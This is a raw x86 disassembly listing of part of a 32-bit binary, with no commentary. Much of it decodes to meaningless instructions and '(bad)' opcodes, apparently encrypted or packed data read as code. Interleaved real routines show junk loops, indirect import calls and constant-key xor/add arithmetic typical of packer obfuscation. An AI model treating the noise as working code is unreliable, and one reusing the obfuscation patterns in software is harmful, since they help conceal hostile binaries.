  407c87:	imul   esi,edx,0xf9e209ad
  407c8d:	mov    ds:0xf79490b4,al
  407c92:	xchg   BYTE PTR [ecx-0xa],ch
  407c95:	mov    edx,0x7e5c1782
  407c9a:	mov    edx,0x29c6a751
  407c9f:	xchg   esi,eax
  407ca0:	sub    eax,0xbef56047
  407ca5:	fild   QWORD PTR [ebx-0x5d93c77d]
  407cab:	sti    
  407cac:	sbb    al,0x28
  407cae:	in     al,0x3
  407cb0:	xor    ch,BYTE PTR [edx+0x3e]
  407cb3:	das    
  407cb4:	sub    DWORD PTR [eax+0x60],eax
  407cb7:	fsub   DWORD PTR [eax]
  407cb9:	stos   DWORD PTR es:[edi],eax
  407cba:	outs   dx,DWORD PTR ds:[esi]
  407cbb:	sub    esp,DWORD PTR [edi+0x58]
  407cbe:	out    0x9,eax
  407cc0:	adc    edx,eax
  407cc2:	push   eax
  407cc3:	or     edx,edi
  407cc5:	(bad)  
  407cc6:	xor    cl,bh
  407cc8:	pop    es
  407cc9:	or     BYTE PTR [ebx+eax*4],0x81
  407ccd:	lock jns 0x407c6c
  407cd0:	(bad)
  407cd3:	and    eax,0x9dc06111
  407cd8:	fst    QWORD PTR [ecx]
  407cda:	and    al,0xfe
  407cdc:	lock mov ch,0xdf
  407cdf:	jmp    0xe60a:0x7d3efe4
  407ce6:	adc    eax,0x3ef5182
  407ceb:	jae    0xca236c94
  407cf1:	mov    ebx,0xc27de1ef
  407cf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cf7:	xor    DWORD PTR [edi],ebx
  407cf9:	add    edx,DWORD PTR ds:0x1466c659
  407cff:	or     DWORD PTR [ecx+0x480b002],esi
  407d05:	dec    ebp
  407d06:	je     0x407d61
  407d08:	jle    0x407cb3
  407d0a:	bound  ebp,QWORD PTR [esi-0x20]
  407d0d:	push   eax
  407d0e:	adc    DWORD PTR [ecx+0x6c],eax
  407d11:	adc    ecx,esp
  407d13:	mov    bl,bh
  407d15:	pop    eax
  407d16:	xchg   DWORD PTR ds:0x1651c02a,esi
  407d1c:	(bad)  
  407d1d:	in     al,dx
  407d1e:	sub    dl,cl
  407d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d22:	push   0x759498b3
  407d27:	push   ebx
  407d28:	dec    eax
  407d29:	test   DWORD PTR [eax-0x52f5f452],esp
  407d2f:	sbb    DWORD PTR [ebp-0x7c],ecx
  407d32:	sbb    al,0xf2
  407d34:	lahf   
  407d35:	in     eax,dx
  407d36:	xor    BYTE PTR [ebp+0x20fb4e63],dl
  407d3c:	push   ds
  407d3d:	add    BYTE PTR [ebx],0xd6
  407d40:	in     eax,0x44
  407d42:	popf   
  407d43:	mov    bh,BYTE PTR [esi+0x3b4bb354]
  407d49:	fstp   DWORD PTR [edi+0xa]
  407d4c:	mov    ch,0xa7
  407d4e:	pop    ebp
  407d4f:	cwde   
  407d50:	int    0xf9
  407d52:	or     al,BYTE PTR ds:0x49b52830
  407d58:	jnp    0x407d34
  407d5a:	inc    eax
  407d5b:	or     cl,ch
  407d5d:	data16 jo 0x407ce7
  407d60:	fs popf 
  407d62:	pop    ss
  407d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d64:	aaa    
  407d65:	mov    edx,0x6d1b566
  407d6a:	or     DWORD PTR [eax-0x6b723574],esp
  407d70:	push   eax
  407d71:	xor    BYTE PTR [ebx+0x7f],dh
  407d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d75:	daa    
  407d76:	and    eax,0x48749469
  407d7b:	sub    bh,BYTE PTR [ebp+0x10]
  407d7e:	aam    0x2b
  407d80:	dec    ebp
  407d81:	adc    edx,ebp
  407d83:	fisubr DWORD PTR ds:0x7dc4b218
  407d89:	inc    eax
  407d8a:	xlat   BYTE PTR ds:[ebx]
  407d8b:	test   BYTE PTR [edx],al
  407d8d:	jno    0x407d9c
  407d8f:	push   ecx
  407d90:	aam    0x26
  407d92:	cmp    al,0x1f
  407d94:	clc    
  407d95:	xor    BYTE PTR [edx+edi*2-0x23],ch
  407d99:	jo     0x407da6
  407d9b:	and    al,0x74
  407d9d:	cwde   
  407d9e:	sub    DWORD PTR [ecx+0x7c9b2810],eax
  407da4:	or     al,0xdc
  407da6:	xchg   ecx,eax
  407da7:	and    cl,al
  407da9:	adc    esi,esp
  407dab:	ins    BYTE PTR es:[edi],dx
  407dac:	test   BYTE PTR [esi+0x43aa3b46],0xa4
  407db3:	mov    eax,ds:0x8a073c50
  407db8:	scas   eax,DWORD PTR es:[edi]
  407db9:	mov    ebp,0x4f6283da
  407dbe:	dec    esi
  407dbf:	test   eax,0x6e8d516b
  407dc4:	mov    dh,0x83
  407dc6:	scas   al,BYTE PTR es:[edi]
  407dc7:	arpl   WORD PTR [edi-0x21],ax
  407dca:	arpl   WORD PTR [esi+0x5b],si
  407dcd:	sub    al,0x94
  407dcf:	xor    ax,0xb15c
  407dd3:	fisub  DWORD PTR [edi+0x5747f057]
  407dd9:	adc    DWORD PTR [ebp-0x282e9d79],0xfa1f0d7b
  407de3:	mov    esp,DWORD PTR [esi+0x28]
  407de6:	xor    bl,BYTE PTR [ebx-0x51]
  407de9:	sub    eax,0x53cac09c
  407dee:	fwait
  407def:	push   es
  407df0:	xchg   edx,eax
  407df1:	mov    al,ds:0xb27dda2
  407df6:	mov    dh,0x19
  407df8:	(bad)  
  407df9:	(bad)  
  407dfa:	stos   BYTE PTR es:[edi],al
  407dfb:	xor    al,0xe0
  407dfd:	mov    bh,0x6c
  407dff:	push   ebp
  407e00:	call   FWORD PTR ds:0x74b39743
  407e06:	out    dx,eax
  407e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e08:	inc    ebp
  407e09:	ret    
  407e0a:	scas   eax,DWORD PTR es:[edi]
  407e0b:	push   ecx
  407e0c:	and    DWORD PTR [edi+0xe],edx
  407e0f:	push   ds
  407e10:	test   ah,ah
  407e12:	adc    edi,DWORD PTR [eax+0x3]
  407e15:	out    dx,al
  407e16:	fist   WORD PTR [edi+0x7c]
  407e19:	mov    esp,DWORD PTR [ebx-0x33]
  407e1c:	mov    ebx,0x98c6d77a
  407e21:	out    dx,eax
  407e22:	push   cs
  407e23:	(bad)  [edx-0x11]
  407e26:	mov    ebx,0x30ff1b1a
  407e2b:	xchg   edx,eax
  407e2c:	sar    BYTE PTR [edx+ebx*8-0x22fc19bf],cl
  407e33:	mov    dh,0xdf
  407e35:	mov    ebx,0xfac2b37a
  407e3a:	out    0x38,al
  407e3c:	cmp    DWORD PTR [ecx-0x56029ef1],edx
  407e42:	inc    edx
  407e43:	leave  
  407e44:	mov    WORD PTR [edi-0x1e92f7ae],?
  407e4a:	inc    edx
  407e4b:	jmp    0x4f09007a
  407e50:	pusha  
  407e51:	mov    dh,0x30
  407e53:	neg    DWORD PTR [eax+0x38a73511]
  407e59:	inc    esp
  407e5a:	sbb    cl,BYTE PTR [edi]
  407e5c:	mov    edi,0x2970001d
  407e61:	mov    DWORD PTR [eax],edx
  407e63:	mov    eax,DWORD PTR [ebp-0xc]
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43366b
  407f81:	or     DWORD PTR ds:0x43366f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4336d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4336d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43371b
  407fad:	sub    DWORD PTR ds:0x4336a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43365b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4336ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4336ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4336ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4336ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4336ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4338e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4336ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4336ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4336ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4336ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4336ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4336ab,ebx
  408048:	cmp    DWORD PTR ds:0x4336ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4336ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4336ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4336ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4336ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4335fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4336db
  4080b1:	and    DWORD PTR ds:0x4336e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43369b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433723,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433723
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433723,ebx
  4080e3:	cmp    DWORD PTR ds:0x433723,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4336db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433723,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433723
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433723,ebx
  40811d:	cmp    DWORD PTR ds:0x433723,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433717,0x1f
  40813b:	cmp    DWORD PTR ds:0x433717,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433717,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433717
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433717,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x713fb30d
  408191:	inc    esi
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	cmp    BYTE PTR [ebp+0x7f],dh
  40819d:	or     DWORD PTR [ecx+0x38],edx
  4081a0:	add    al,0xd9
  4081a2:	jg     0x4081b6
  4081a4:	cwde   
  4081a5:	mov    bh,0xbf
  4081a7:	mov    cl,0x30
  4081a9:	push   eax
  4081ab:	fisub  DWORD PTR [ecx+esi*2+0x6f28f504]
  4081b2:	fist   DWORD PTR [ecx+0x5c]
  4081b5:	cmp    al,0xe8
  4081b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081b8:	gs aam 0x40
  4081bb:	fdiv   DWORD PTR [esi]
  4081bd:	inc    esi
  4081be:	mov    edi,0x5df1a045
  4081c3:	sar    DWORD PTR [eax+0x6924e632],0x76
  4081ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081cb:	mov    esi,0x42a9d069
  4081d0:	mov    ds:0x2d11c4af,al
  4081d5:	pop    ebp
  4081d6:	cmp    BYTE PTR [edi],0x35
  4081d9:	sbb    al,0xca
  4081db:	and    ebx,DWORD PTR [edi+ebx*1]
  4081de:	dec    eax
  4081df:	std    
  4081e0:	mov    eax,0x438d6ba5
  4081e5:	ss inc ebp
  4081e7:	ret    0x1c22
  4081ea:	repnz add al,0x56
  4081ed:	icebp  
  4081ee:	lods   eax,DWORD PTR ds:[esi]
  4081ef:	imul   esi,DWORD PTR [esi+0x7f337c4f],0xffffff8a
  4081f6:	sub    BYTE PTR [eax-0x28],ch
  4081f9:	les    esi,FWORD PTR ds:0x8addf75b
  4081ff:	mov    ds:0x85727670,eax
  408204:	test   dh,dh
  408206:	jns    0x408281
  408208:	in     al,dx
  408209:	jmp    0x766e:0xd4e0e4fc
  408210:	fimul  DWORD PTR ds:0x684d2a06
  408216:	mov    ebp,0xa6fb43b8
  40821b:	aas    
  40821c:	xor    ebx,DWORD PTR [ecx]
  40821e:	repz gs jmp 0xa3e7:0xd82322cd
  408227:	mov    eax,0x86796098
  40822c:	mov    ch,0x32
  40822e:	add    al,0x5c
  408230:	scas   eax,DWORD PTR es:[edi]
  408231:	xchg   ecx,eax
  408232:	pop    ss
  408233:	xor    eax,0x31f16294
  408238:	sahf   
  408239:	cmp    eax,0x7aa3f8d3
  40823e:	fidivr DWORD PTR [ebp-0x51335570]
  408244:	int    0x69
  408246:	inc    ecx
  408247:	jl     0x4082a6
  408249:	js     0x40823c
  40824b:	xchg   ebx,eax
  40824c:	lock push 0x64c396b9
  408252:	cwde   
  408253:	xchg   ebp,eax
  408254:	call   0x2711:0x28b049dc
  40825b:	das    
  40825c:	enter  0x55e1,0xcc
  408260:	xchg   esi,eax
  408261:	inc    ebx
  408262:	add    DWORD PTR [edi],ebp
  408264:	dec    ecx
  408265:	push   ebx
  408266:	push   eax
  408267:	and    bl,BYTE PTR [edi+0x2f111cb4]
  40826d:	mov    bl,0x70
  40826f:	in     al,0x5f
  408271:	call   0xf75c:0xcfcc77c2
  408278:	xchg   BYTE PTR [edi*4-0xc3be125],bl
  40827f:	rcr    BYTE PTR [ebp+eax*2-0x3c],1
  408283:	xor    al,bl
  408285:	inc    esi
  408286:	leave  
  408287:	loope  0x408268
  408289:	sub    DWORD PTR [eax],ecx
  40828b:	test   DWORD PTR [edi-0x53],edi
  40828e:	add    eax,ecx
  408290:	fiadd  WORD PTR [edx-0x3]
  408293:	out    0x89,eax
  408295:	dec    eax
  408296:	ss adc al,0x88
  408299:	mov    ecx,0x307f193f
  40829e:	cs out 0x2d,al
  4082a1:	aam    0x8e
  4082a3:	mov    bh,0x3d
  4082a5:	xchg   ecx,eax
  4082a6:	push   ss
  4082a7:	aas    
  4082a8:	mov    eax,0xb32c8400
  4082ad:	cmp    esi,eax
  4082af:	fstsw  WORD PTR gs:[esi+0x1f]
  4082b4:	cdq    
  4082b5:	(bad)  
  4082b6:	sbb    esp,DWORD PTR [ecx-0x28]
  4082b9:	call   0x7979:0xaf3ab0df
  4082c0:	iret   
  4082c1:	popf   
  4082c2:	mov    bh,0xdb
  4082c4:	add    eax,0xc83f746e
  4082c9:	iret   
  4082ca:	aam    0xfe
  4082cc:	imul   eax,DWORD PTR [ebx+0x544fceaf],0xffffff8d
  4082d3:	jge    0x408283
  4082d5:	loope  0x408323
  4082d7:	test   eax,0xaac09d02
  4082dc:	ret    0xa33e
  4082df:	mov    ebx,0x34edb520
  4082e4:	sbb    al,0xf9
  4082e6:	push   ebx
  4082e7:	js     0x408277
  4082e9:	outs   dx,BYTE PTR ds:[esi]
  4082ea:	push   ds
  4082eb:	mov    ecx,0x3ce3db8
  4082f0:	xor    ah,BYTE PTR [eax+0x4721658b]
  4082f6:	add    cl,bh
  4082f8:	sbb    DWORD PTR [esi],0x40
  4082fb:	jnp    0x408369
  4082fd:	add    ebp,DWORD PTR [ebx]
  4082ff:	(bad)  [eax]
  408301:	inc    esp
  408302:	in     al,dx
  408303:	jnp    0x408380
  408305:	mov    edx,0x16a5d32
  40830a:	inc    edi
  40830b:	lods   al,BYTE PTR ds:[esi]
  40830c:	js     0x408335
  40830e:	inc    ebx
  40830f:	mov    ds:0xa2ec4d13,al
  408314:	fisub  WORD PTR [edi+eiz*2+0x62]
  408318:	mov    edi,0x2ce376b9
  40831e:	scas   al,BYTE PTR es:[edi]
  40831f:	bound  esp,QWORD PTR [edx+ebp*4+0x37]
  408323:	rcl    bl,cl
  408325:	jp     0x408310
  408327:	mov    eax,0x87fa9552
  40832c:	adc    ecx,DWORD PTR [esi-0x22]
  40832f:	ins    BYTE PTR es:[edi],dx
  408330:	jg     0x40830f
  408332:	or     eax,0x1b249b81
  408337:	pop    ecx
  408338:	jns    0x4082d1
  40833a:	add    bl,ah
  40833c:	mov    bl,BYTE PTR [ecx+ebp*8+0x7d7222ab]
  408343:	xor    esi,edi
  408345:	cli    
  408346:	popf   
  408347:	xor    BYTE PTR [ecx],ch
  408349:	jmp    0x81c7:0x7a03b374
  408350:	mov    bl,0x1f
  408352:	in     al,dx
  408353:	inc    eax
  408354:	scas   al,BYTE PTR es:[edi]
  408355:	push   ds
  408356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408357:	mov    dl,bl
  408359:	cmc    
  40835a:	das    
  40835b:	imul   esi,edi,0xdc44956b
  408361:	retf   
  408362:	inc    eax
  408363:	pop    esp
  408364:	(bad)  
  408365:	mov    ah,0x32
  408367:	mov    edx,0x6f03c041
  40836c:	cmc    
  40836d:	aad    0xbf
  40836f:	mov    ds:0x55d398f9,al
  408374:	cdq    
  408375:	push   esp
  408376:	daa    
  408377:	mov    ds:0x861ea96a,eax
  40837c:	lea    ecx,[ebp+0x36]
  40837f:	adc    bh,ah
  408381:	mov    dh,BYTE PTR [edi+ecx*4]
  408384:	out    dx,al
  408385:	adc    al,0x92
  408387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408388:	jp     0x408360
  40838a:	xchg   ebx,eax
  40838b:	cmp    eax,0x9fabf07a
  408390:	lock call 0xa01dd7e9
  408396:	imul   ebx,DWORD PTR [edx+eax*2],0x1e
  40839a:	cmp    edx,DWORD PTR [esi-0x3dc5139d]
  4083a0:	test   DWORD PTR [ebp-0x75],edx
  4083a3:	inc    ecx
  4083a4:	push   0x25
  4083a6:	sub    al,0x1f
  4083a8:	xor    eax,0x1d94d277
  4083ad:	fcmovb st,st(6)
  4083af:	loop   0x4083e2
  4083b1:	push   eax
  4083b2:	inc    ebp
  4083b3:	pop    ebp
  4083b4:	push   0x6d2c7e0f
  4083b9:	adc    al,0xc1
  4083bb:	mov    al,0x33
  4083bd:	mov    edx,0xac26cf8a
  4083c2:	cmp    al,0x94
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43365b,0x0
  4083d1:	mov    eax,ds:0x43365b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43365b,eax
  4083dc:	cmp    DWORD PTR ds:0x43365b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43365b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43365b
  40840c:	inc    eax
  40840d:	mov    ds:0x43365b,eax
  408412:	cmp    DWORD PTR ds:0x43365b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43360b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433613,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433727
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	mov    esi,0xe479a250
  408469:	enter  0x7e7e,0x24
  40846d:	jl     0x4084ed
  40846f:	jle    0x40849f
  408471:	mov    ds:0x2c4c9d9f,eax
  408476:	jns    0x4084c7
  408478:	scas   al,BYTE PTR es:[edi]
  408479:	inc    edx
  40847a:	loop   0x4084e0
  40847c:	fldcw  WORD PTR ds:0xb310b556
  408482:	mov    al,0xf4
  408484:	test   al,0x1f
  408486:	pushf  
  408487:	icebp  
  408488:	cmp    al,0x78
  40848a:	xchg   DWORD PTR [ecx-0x5dae7184],esp
  408490:	call   0x4e628736
  408495:	or     ecx,0xbbf66c59
  40849b:	xchg   ebp,eax
  40849c:	and    al,0x34
  40849e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40849f:	in     al,0x67
  4084a1:	pop    ss
  4084a2:	in     eax,0xcc
  4084a4:	ror    ch,0x47
  4084a7:	cdq    
  4084a8:	scas   eax,DWORD PTR es:[edi]
  4084a9:	inc    eax
  4084aa:	and    DWORD PTR [ebp+0x3b519b18],0xffffffd7
  4084b1:	sub    dl,cl
  4084b3:	pop    ebx
  4084b4:	ret    0xb35a
  4084b7:	xor    al,0x56
  4084b9:	jb     0x408476
  4084bb:	mov    eax,ds:0x614ebd7e
  4084c0:	clc    
  4084c1:	push   esi
  4084c2:	mov    ecx,0x429c1e42
  4084c7:	sbb    al,0x83
  4084c9:	popa   
  4084ca:	aaa    
  4084cb:	jecxz  0x40846b
  4084cd:	pop    ebp
  4084ce:	(bad)  
  4084cf:	cmp    cl,BYTE PTR [edi-0x1dcb0ac6]
  4084d5:	xchg   esi,eax
  4084d6:	and    ecx,DWORD PTR [esi-0x62ec7aa4]
  4084dc:	jmp    0xc6b8:0xef89db21
  4084e3:	js     0x408559
  4084e5:	pop    ds
  4084e6:	push   ss
  4084e7:	cs xchg ecx,eax
  4084e9:	pop    esp
  4084ea:	pop    eax
  4084eb:	int3   
  4084ec:	and    DWORD PTR [esi+0x6a049f9],0x591ecefc
  4084f6:	imul   ebx,DWORD PTR cs:[ebp-0x54acccf2],0xea9363fe
  408501:	dec    ecx
  408502:	xchg   DWORD PTR [edi],ebx
  408504:	and    eax,0x734b213d
  408509:	fcomi  st,st(3)
  40850b:	inc    edx
  40850c:	xchg   ecx,eax
  40850d:	loop   0x4084b6
  40850f:	push   ds
  408510:	inc    ebp
  408511:	rcr    BYTE PTR [edx+0x28],cl
  408514:	inc    edx
  408515:	dec    esi
  408516:	push   0x6f809784
  40851b:	inc    ebx
  40851c:	mov    al,0x1f
  40851e:	pop    esp
  40851f:	mov    ebp,0x78355ab
  408524:	pop    ds
  408525:	adc    eax,0x42ab81cb
  40852a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40852b:	sbb    eax,0xa62fe128
  408530:	and    cl,ah
  408532:	cmp    bl,dl
  408534:	je     0x40856e
  408536:	mov    eax,0x8106a384
  40853b:	out    0xcd,eax
  40853d:	mov    ecx,0xe8cd7ae6
  408542:	pop    ecx
  408543:	(bad)  
  408544:	push   esi
  408545:	dec    ecx
  408546:	xchg   ebp,eax
  408547:	in     al,0xa1
  408549:	add    eax,0x8608628e
  40854e:	sahf   
  40854f:	mov    ah,0xde
  408551:	and    DWORD PTR [ecx-0xbbeaa1],esi
  408557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408558:	inc    esi
  408559:	add    DWORD PTR [edi+0x74],esp
  40855c:	dec    ecx
  40855d:	fs pop eax
  40855f:	loopne 0x408552
  408561:	add    eax,0x279e4c41
  408566:	sbb    eax,0xfe5fa404
  40856b:	inc    esi
  40856c:	cs retf 
  40856e:	loopne 0x408591
  408570:	fidiv  DWORD PTR [eax+eiz*4]
  408573:	mov    esi,0xd083c37d
  408578:	pop    es
  408579:	push   0x35
  40857b:	dec    ecx
  40857c:	mov    ecx,0x9fcdbe15
  408581:	xchg   ecx,eax
  408582:	push   esp
  408583:	outs   dx,DWORD PTR ds:[esi]
  408584:	mov    esi,0x97134f60
  408589:	lods   al,BYTE PTR ds:[esi]
  40858a:	pop    edi
  40858b:	mov    bl,0x6d
  40858d:	rcl    ch,0x56
  408590:	inc    edx
  408591:	jge    0x40860e
  408593:	pop    edi
  408594:	adc    ebp,DWORD PTR [esi]
  408596:	mov    eax,ds:0x249db8f5
  40859b:	test   DWORD PTR [eax],0xfdc0486f
  4085a1:	stos   BYTE PTR es:[edi],al
  4085a2:	idiv   DWORD PTR [esp+edi*4+0x7d]
  4085a6:	das    
  4085a7:	out    0x30,eax
  4085a9:	mov    ch,0xbb
  4085ab:	cmp    al,0x53
  4085ad:	fs test esi,esi
  4085b0:	xchg   ebp,eax
  4085b1:	mov    dh,0xa6
  4085b3:	or     al,BYTE PTR [edx+eiz*8]
  4085b6:	mov    esp,0x1ba84ac8
  4085bb:	ja     0x40860b
  4085bd:	push   ss
  4085be:	adc    eax,0xafa00d76
  4085c3:	iret   
  4085c4:	xor    al,0x86
  4085c6:	lods   al,BYTE PTR ds:[esi]
  4085c7:	inc    edi
  4085c8:	pop    ebp
  4085c9:	and    BYTE PTR [esi-0x50c1eba7],dh
  4085cf:	adc    eax,0x2bb432e2
  4085d4:	sbb    eax,0xd5c652ad
